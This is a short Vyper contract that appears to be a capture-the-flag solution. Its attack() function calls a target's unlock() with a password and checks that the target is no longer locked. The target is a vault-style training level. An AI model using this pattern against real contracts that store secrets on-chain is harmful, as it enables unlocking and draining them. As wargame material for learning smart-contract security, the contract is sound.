# @version ^0.3.7

interface InstanceInterface:
    def locked() -> bool: view
    def unlock(_password: bytes32): nonpayable

owner: immutable(address)

instance: InstanceInterface

@external
@payable
def __init__(_instance: InstanceInterface):
    owner = msg.sender
    self.instance = _instance

@external
def attack(password: Bytes[32]):
    assert msg.sender == owner, "!owner"
    self.instance.unlock(convert(password, bytes32))
    assert self.instance.locked() == False, "level !passed"
